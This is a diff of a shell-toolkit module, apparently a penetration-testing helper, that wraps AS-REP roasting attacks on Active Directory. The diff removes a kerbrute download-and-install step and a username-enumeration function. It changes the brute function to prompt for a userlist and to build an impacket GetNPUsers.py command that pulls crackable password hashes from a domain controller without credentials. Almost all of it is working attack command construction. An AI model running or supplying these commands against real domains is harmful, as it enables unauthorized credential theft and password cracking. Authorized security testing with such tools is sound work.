@@ -13,7 +13,6 @@ The nb-ad-asrep namespace contains commands for as-rep roast attack on Active Di
 Commands
 --------
 nb-ad-asrep-install        installs dependencies
-nb-ad-asrep-enum-users     utilize kerbrute to enumerate usernames
 nb-ad-asrep-brute          brute force a password hashes of given users
 nb-ad-asrep-crack          crack the password hash
 
@@ -23,35 +22,25 @@ DOC
 nb-ad-asrep-install() {
   __info "Running $0..."
   __pkgs impacket
-  
-  # Download kerbrute binary
-  curl -LO https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 ~/downloads/
-  chmod +x ~/downloads/kerbrute_linux_amd64
-  sudo mv ~/downloads/kerbrute_linux_amd64 /bin/kerbrute
-  __info "kerbrute is now available"
-}
-
-nb-ad-asrep-enum-users() {
-  __ask "Enter target AD domain (must also be set in your hosts file)"
-  nb-vars-set-domain
-	__ask "Enter a users wordlist"
-	nb-vars-set-wordlist
-  __ask "Enter location of the Domain Controller (KDC) to target"
-  # e.g. dc.${__DOMAIN}
-  local dc && __askvar dc DOMAIN_CONTROLLER
-
-  print -z "kerbrute userenum --dc $dc -d ${__DOMAIN} ${__WORDLIST} | tee $(__domadpath)/kerbrute.txt"
 }
 
 nb-ad-asrep-brute() {
+  __ask "Did you enumerate users into a userlist file? (y/n)"
+  local sh && __askvar sh "ANSWER"
+
+  if [[ $sh == "n" ]]; then
+    __err "You need a valid userlist file to perform asrep roasting."
+    __info "Use nb-ad-enum-users."
+    exit 1
+  fi
+
 	__ask "Enter the IP address of the target domain controller"
 	nb-vars-set-rhost
-  __ask "Enter target AD domain (must also be set in your hosts file)"
   nb-vars-set-domain
 	__ask "Enter a users wordlist"
-	nb-vars-set-wordlist
+  __askpath ul FILE $HOME/desktop/projects/
 
-	print -z "GetNPUsers.py -dc-ip ${__RHOST} ${__DOMAIN}.local/ -no-pass -usersfile ${__WORDLIST} | tee $(__domadpath)/GetNPUsers.txt"
+	print -z "GetNPUsers.py -dc-ip ${__RHOST} ${__DOMAIN}.local/ -no-pass -usersfile $ul | tee $(__domadpath)/GetNPUsers.txt"
 }
 
 nb-ad-asrep-crack() {
